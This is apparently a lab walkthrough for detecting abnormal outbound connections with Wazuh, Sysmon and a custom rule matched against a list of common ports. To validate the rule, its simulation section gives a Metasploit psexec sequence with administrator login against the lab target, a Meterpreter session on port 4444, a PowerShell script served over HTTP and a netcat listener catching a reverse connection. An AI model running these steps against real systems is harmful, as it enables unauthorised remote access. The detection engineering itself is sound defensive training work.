# Detecting Abnormal Network Connections With Wazuh

> **INE Lab Walkthrough**  
> **Category:** SOC / SIEM / Detection Engineering  
> **Platform:** Wazuh + Sysmon + Windows Server 2019 + Kali Linux

---

## 📌 Lab Overview

This lab demonstrates how to detect **abnormal outbound network connections** from a Windows endpoint using Wazuh.

The detection is built around **Sysmon Event ID 3**, which records network connections. A Wazuh CDB (Constant Database) list is used as a baseline of commonly used ports. A custom Wazuh rule then generates a **Level 10 alert** whenever a network connection is made to a destination port that is not in that baseline.

### Detection Pipeline

```text
Windows Target
      │
      │ Sysmon Event ID 3
      ▼
Wazuh Agent
      │
      ▼
Wazuh Manager
      │
      ├── CDB: common-ports
      │
      ├── Destination port NOT found
      │
      ▼
Custom Rule 115001
      │
      ▼
Level 10 Alert
      │
      ▼
Wazuh Dashboard
```

---

## 🎯 Objectives

- Deploy the Wazuh Agent on Windows.
- Install and configure Sysmon.
- Forward Sysmon events to Wazuh.
- Create a CDB list of common ports.
- Write a custom Wazuh detection rule.
- Simulate suspicious network activity.
- Detect uncommon destination ports from the Wazuh Dashboard.
- Validate the detection with two different attack simulations.

---

## 🖥️ Lab Environment

| Machine | Role | IP Address |
|---|---|---|
| Ubuntu | SOC / Wazuh Server | `10.4.22.249` |
| Windows Server 2019 | Target | `10.4.20.157` |
| Kali Linux | Attacker | `10.10.50.12` |

> **Note:** These IP addresses belong to this lab session. Do not reuse the example IPs from the original INE instructions in another lab environment.

---

# 🔹 Task 1 — Deploy the Wazuh Agent

## Step 1 — Identify the Wazuh Server IP

On the SOC machine:

```bash
ip addr
```

The Wazuh server interface showed:

```text
inet 10.4.22.249/20
```



---

## Step 2 — Install the Wazuh Agent

On the Windows target, open **PowerShell as Administrator**.

Navigate to the installer:

```powershell
cd Desktop\Tools
```

Install the agent using the actual Wazuh server IP:

```powershell
msiexec.exe /i wazuh-agent-4.3.10-1.msi /q WAZUH_MANAGER=10.4.22.249 WAZUH_REGISTRATION_SERVER=10.4.22.249 WAZUH_AGENT_GROUP=default
```

Start the service:

```powershell
Start-Service -Name WazuhSvc
```

Verify:

```powershell
Get-Service WazuhSvc
```

Expected:

```text
Status   Name
------   ----
Running  WazuhSvc
```

The Windows agent then appeared as an **active agent** in the Wazuh Dashboard.

### Result

```text
✅ Wazuh Agent connected successfully
```

---

# 🔹 Task 2 — Configure Sysmon and Wazuh

## Step 1 — Install Sysmon

On Windows:

```powershell
cd Desktop\Tools
```

Install Sysmon using the provided configuration:

```powershell
.\Sysmon64.exe -accepteula -i sysmonconfig.xml
```

Verify the service:

```powershell
Get-Service Sysmon64
```

Expected:

```text
Status   Name
------   ----
Running  Sysmon64
```



---

## Step 2 — Configure Wazuh to collect Sysmon events

Open:

```text
C:\Program Files (x86)\ossec-agent\ossec.conf
```

Add:

```xml
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```

Restart the Wazuh Agent:

```powershell
Restart-Service -Name WazuhSvc
```



### Important Sysmon Event

**Event ID 3 — Network Connection**

This event provides the network connection telemetry needed by the detection rule.

---

# 🔹 Task 3 — Configure the CDB Common Ports List

Switch to the SOC/Wazuh server.

Navigate to:

```bash
cd /var/ossec/etc/lists/
```

Create the CDB list:

```bash
sudo nano common-ports
```

Add:

```text
21:
25:
22:
53:
80:
135:
389:
443:
445:
993:
995:
1514:
1515:
3389:
3306:
5000:
5223:
8000:
8002:
8080:
8083:
8443:
```

These ports represent the **common/expected ports** for this lab.

Set ownership and permissions:

```bash
sudo chown wazuh:wazuh common-ports
sudo chmod 660 common-ports
```

---

## Load the CDB list

Edit:

```bash
sudo nano /var/ossec/etc/ossec.conf
```

Inside the `<ruleset>` section, add:

```xml
<list>etc/lists/common-ports</list>
```

Restart the Wazuh Manager:

```bash
sudo systemctl restart wazuh-manager
```

Verify:

```bash
sudo systemctl status wazuh-manager
```

Expected:

```text
Active: active (running)
```

### CDB Logic

```text
Destination Port
       │
       ▼
common-ports
       │
 ┌─────┴─────┐
 │           │
Found      Not Found
 │           │
No alert   Rule 115001
             │
             ▼
          Level 10
```

For example:

```text
443  → common → no uncommon-port alert
8080 → common → no uncommon-port alert
4444 → uncommon → alert
1234 → uncommon → alert
```

---

# 🔹 Task 4 — Create the Detection Rule

Edit the Wazuh local rules:

```bash
sudo nano /var/ossec/etc/rules/local_rules.xml
```

Add:

```xml
<group name="windows,sysmon,">
    <rule id="115001" level="10">
        <if_sid>61605</if_sid>
        <list field="win.eventdata.destinationPort" lookup="not_match_key">etc/lists/common-ports</list>
        <description>[Network connection]: Network connection to an Uncommon Port $(win.eventdata.destinationPort) by $(win.eventdata.image)</description>
    </rule>
</group>
```

### Rule Breakdown

| Configuration | Meaning |
|---|---|
| `id="115001"` | Custom rule ID |
| `level="10"` | High-priority alert |
| `<if_sid>61605</if_sid>` | Builds on the relevant Sysmon network event |
| `destinationPort` | Field being checked |
| `not_match_key` | Alert when the port is not found |
| `common-ports` | Baseline of common ports |

Validate the configuration:

```bash
sudo /var/ossec/bin/wazuh-analysisd -t
```

Restart Wazuh:

```bash
sudo systemctl restart wazuh-manager
```

---

# 🔥 Task 5 — Simulate Abnormal Network Activity

Two detection scenarios were tested.

---

## 🧪 Test 1 — Metasploit

On Kali:

```bash
msfconsole -q
```

Use the SMB PsExec module:

```text
use exploit/windows/smb/psexec
set RHOSTS 10.4.20.157
set SMBUser administrator
set SMBPass <LAB_PASSWORD>
exploit
```

> **Security note:** The lab password is intentionally omitted from this public GitHub documentation.

Metasploit successfully opened a Meterpreter session:

```text
Meterpreter session 1 opened
(10.10.50.12:4444 -> 10.4.20.157:50097)
```

The important observation is the reverse connection using destination port:

```text
4444
```

Port `4444` is **not present** in `common-ports`.

---

## 🚨 Wazuh Detection — Port 4444

The Wazuh Dashboard generated:

```text
[Network connection]: Network connection to an Uncommon Port 4444
by C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
```

Detection details:

```text
Rule ID: 115001
Level:   10
Port:    4444
Process: powershell.exe
```

![Wazuh Dashboard — Port 4444 Alert](wazuh_verify.png)

### Detection Result

```text
Metasploit
    ↓
Windows network connection
    ↓
Destination port 4444
    ↓
4444 not in common-ports
    ↓
Rule 115001
    ↓
🚨 Level 10 Alert
```

---

# 🧪 Test 2 — PowerShell + Netcat

The second simulation used a PowerShell script hosted from Kali and a Netcat listener on an uncommon port.

## Step 1 — Create the script

On Kali:

```bash
nano mypowershell.ps1
```

The script was configured to connect to:

```text
10.10.50.12:1234
```

---

## Step 2 — Host the script

Start a Python HTTP server:

```bash
python3 -m http.server 80
```

The Windows target successfully downloaded the script:

```text
10.4.20.157 - - [07/Oct/2026 11:12:00]
"GET /mypowershell.ps1 HTTP/1.1" 200 -
```

This confirmed that the script delivery worked.

---

## Step 3 — Start the Netcat listener

On another Kali terminal:

```bash
nc -lvnp 1234
```

The listener received:

```text
Connection from 10.4.20.157.
Connection from 10.4.20.157:50106.
```

This confirmed a Windows connection to Kali on port `1234`.

---

# 🚨 Wazuh Detection — Port 1234

The Wazuh Dashboard generated another **Rule 115001 / Level 10** alert:

```text
[Network connection]: Network connection to an Uncommon Port 1234
by C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

![Wazuh Dashboard — Port 1234 and 4444 Alerts](wazuh_verify2.png)

### Additional Dashboard Evidence

![Wazuh Dashboard — Port 4444 Alert](wazuh_verify.png)

### Detection Result

```text
PowerShell
    ↓
Windows network connection
    ↓
Destination port 1234
    ↓
1234 not in common-ports
    ↓
Rule 115001
    ↓
🚨 Level 10 Alert
```

---


## 📸 Evidence Gallery

Use the following screenshots as visual evidence for the lab results.

### Wazuh Dashboard — Port 1234 Detection

![Wazuh Dashboard Port 1234](wazuh_verify2.png)

### Wazuh Dashboard — Port 4444 Detection

![Wazuh Dashboard Port 4444](wazuh_verify.png)


# 📊 Final Results

| Simulation | Port | Rule | Level | Result |
|---|---:|---:|---:|---|
| Metasploit | `4444` | `115001` | `10` | ✅ Detected |
| PowerShell + Netcat | `1234` | `115001` | `10` | ✅ Detected |

---

# 🔍 SOC Analyst Perspective

This lab demonstrates a simple but useful form of **behavior-based detection**.

Instead of creating a rule specifically for Metasploit, the detection looks for an abnormal characteristic:

```text
Network connection
       +
Destination port not in baseline
       =
Suspicious network activity
```

This makes the rule independent of the exact tool used.

For example, both of these were detected:

```text
Metasploit → 4444
PowerShell → 1234
```

because both ports were outside the configured baseline.

---

# 🧠 Key Takeaways

### 1. Sysmon provides endpoint visibility

Sysmon Event ID 3 gives the SOC useful information about network connections made by Windows processes.

### 2. Wazuh centralizes the telemetry

The Wazuh Agent forwards Windows/Sysmon events to the Wazuh Manager for analysis.

### 3. CDB lists can establish a baseline

The `common-ports` list defines ports considered normal for this lab.

### 4. Custom rules enable detection engineering

Rule `115001` was created specifically to identify connections to ports outside the baseline.

### 5. Detection should be validated

The rule was not just configured; it was tested using two different simulations:

```text
4444 → Detected ✅
1234 → Detected ✅
```

### 6. Context matters

A connection to an uncommon port is **not automatically malicious** in a real environment. Analysts should investigate the destination, process, user, host role, timing, and surrounding events before declaring an incident.

---

# 🗺️ Detection Map

```text
                    ┌───────────────────┐
                    │   Kali Attacker   │
                    │   10.10.50.12     │
                    └─────────┬─────────┘
                              │
                    ┌─────────┴─────────┐
                    │                   │
                 :4444                :1234
                Metasploit          PowerShell
                    │                   │
                    └─────────┬─────────┘
                              ▼
                    ┌───────────────────┐
                    │ Windows Target    │
                    │ 10.4.20.157       │
                    └─────────┬─────────┘
                              │
                      Sysmon Event ID 3
                              │
                              ▼
                    ┌───────────────────┐
                    │   Wazuh Agent     │
                    └─────────┬─────────┘
                              │
                              ▼
                    ┌───────────────────┐
                    │  Wazuh Manager    │
                    │ 10.4.22.249       │
                    └─────────┬─────────┘
                              │
                     CDB common-ports
                              │
                    Port not in baseline
                              │
                              ▼
                    ┌───────────────────┐
                    │ Rule 115001       │
                    │ Level 10          │
                    └─────────┬─────────┘
                              │
                              ▼
                    🚨 Security Alert
```

---

# 🏁 Conclusion

In this lab, I configured Wazuh and Sysmon to detect abnormal network connections from a Windows endpoint.

The implementation covered:

```text
Wazuh Agent
     ↓
Sysmon
     ↓
Event ID 3
     ↓
CDB Baseline
     ↓
Custom Detection Rule
     ↓
Security Alert
```

The custom Wazuh rule successfully detected two uncommon destination ports:

```text
4444 → Metasploit → Level 10 ✅
1234 → PowerShell/Netcat → Level 10 ✅
```

### Skills Demonstrated

- 🛡️ Wazuh SIEM
- 🪟 Windows Security Monitoring
- 🔎 Sysmon
- 📋 Log Collection
- ⚙️ Wazuh Custom Rules
- 🗃️ CDB Lists
- 🚨 Alert Validation
- 🔬 Detection Engineering
- 👨‍💻 SOC Analyst Workflow

---

## 📚 References

- [Wazuh](https://wazuh.com/)
- [Microsoft Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- INE — **Detecting Abnormal Network Connections With Wazuh**

---

## 📁 Repository Structure

Recommended structure inside `INE_labs`:

```text
Detecting_Abnormal_Network_Connections_With_Wazuh/
├── Detecting_Abnormal_Network_Connections_With_Wazuh_Walkthrough.md
└── images/
    ├── 01-soc-machine-ip.png
    ├── 02-windows-wazuh-agent-sysmon.png
    ├── 03-sysmon-wazuh-integration.png
    ├── 04-wazuh-alert-port-4444.png
    ├── 05-wazuh-alerts-port-1234-and-4444.png
    ├── 06-wazuh-dashboard-port-1234.png
    └── 07-wazuh-dashboard-port-4444.png
```

> This version is prepared for a **public GitHub repository**: the lab password is intentionally replaced with `<LAB_PASSWORD>` so credentials are not committed to Git.
